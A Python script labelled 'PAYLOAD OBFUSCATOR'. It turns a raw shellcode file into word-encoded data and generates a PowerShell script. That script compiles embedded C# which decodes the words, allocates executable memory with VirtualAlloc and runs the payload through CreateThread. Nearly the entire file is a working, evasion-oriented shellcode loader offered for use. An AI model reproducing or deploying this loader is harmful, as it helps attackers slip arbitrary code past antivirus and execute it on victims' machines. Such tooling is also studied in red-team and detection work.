#!/usr/bin/env python3

import requests
import random
import sys
import os


def main(input_file):
    word_site = "https://www.mit.edu/~ecprice/wordlist.10000"
    response = requests.get(word_site)
    if response.status_code != 200:
        raise Exception("Failed to fetch word list from the provided URL.")
    words = response.content.splitlines()
    words = [word.decode('utf-8') for word in words]
    random.shuffle(words)
    hex_values = [f'0x{i:02x}' for i in range(256)]
    word_dict = dict(zip(hex_values, words[:256]))

    # dictionnary
    dict_items = [f'"{word}" = {hex_val}' for hex_val, word in word_dict.items()]
    powershell_dict = "$wordDict = @{\n    " + "\n    ".join(dict_items) + "\n}"

    # payload
    encoded_string = "$data = '"
    hex_payload = []
    if not os.path.isfile(input_file):
        raise FileNotFoundError(f"The file {input_file} does not exist.")
    with open(input_file, 'rb') as f_in:
        byte = f_in.read(1)
        while byte:
            hex_value = f"0x{byte.hex()}"
            hex_payload.append(hex_value)
            if hex_value in word_dict:
                encoded_string += word_dict[hex_value] + ' '
            else:
                raise Exception(f"Hex value {hex_value} not found in word dictionary.")
            byte = f_in.read(1)
    encoded_string = encoded_string.strip() + "'"

    
    psh_headers = """
$wordDictJson = $wordDict | ConvertTo-Json -Depth 1

$Program = @"
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Web.Script.Serialization;

public class Program
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static void Run(string data, string wordDictJson){
        Console.WriteLine("[+] RUN MOTHERFUCKER !");
        JavaScriptSerializer serializer = new JavaScriptSerializer();
        Dictionary<string, byte> wordDict = serializer.Deserialize<Dictionary<string, byte>>(wordDictJson);

        Console.WriteLine("[+] Decoding payload...");
        byte[] decodedBytes = DecodeWordsToBytes(data, wordDict);

        Console.WriteLine("[+] Allocating memory...");
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decodedBytes.Length, 0x3000, 0x40);

        Console.WriteLine("[+] Copying payload...");
        Marshal.Copy(decodedBytes, 0, addr, decodedBytes.Length);

        Console.WriteLine("[+] Creating thread...");
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        Console.WriteLine("[+] Waiting for execution...");
        WaitForSingleObject(hThread, 0xFFFFFFFF);
        VirtualFree(addr, 0, 0x8000);

        Console.WriteLine("[+] Done.");
    }

    static byte[] DecodeWordsToBytes(string data, Dictionary<string, byte> wordDict){
        var words = data.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
        var byteList = new List<byte>();
        foreach (var word in words){
            if (wordDict.ContainsKey(word)){
                byteList.Add(wordDict[word]);
            }
        }
        return byteList.ToArray();
    }
}
"@

Add-Type -TypeDefinition $Program -ReferencedAssemblies "System.Web.Extensions.dll", "System.Runtime.dll"

[Program]::Run($data, $wordDictJson)
"""

    psh_code = f"{encoded_string}\n\n\n{powershell_dict}\n\n\n{psh_headers}"
    with open('generated_code.ps1', 'w') as f:
        f.write(psh_code)
    print("Code Powershell généré avec succès dans 'generated_code.ps1'")





if __name__ == "__main__":
    print("##########################################")
    print("########### PAYLOAD OBFUSCATOR ###########")
    print("##########################################\n")
    if len(sys.argv) != 2:
        print("Usage: python encode_psh.py <path_to_raw_payload_file>\n")
        sys.exit(1)
    
    file_path = sys.argv[1]
    main(file_path)
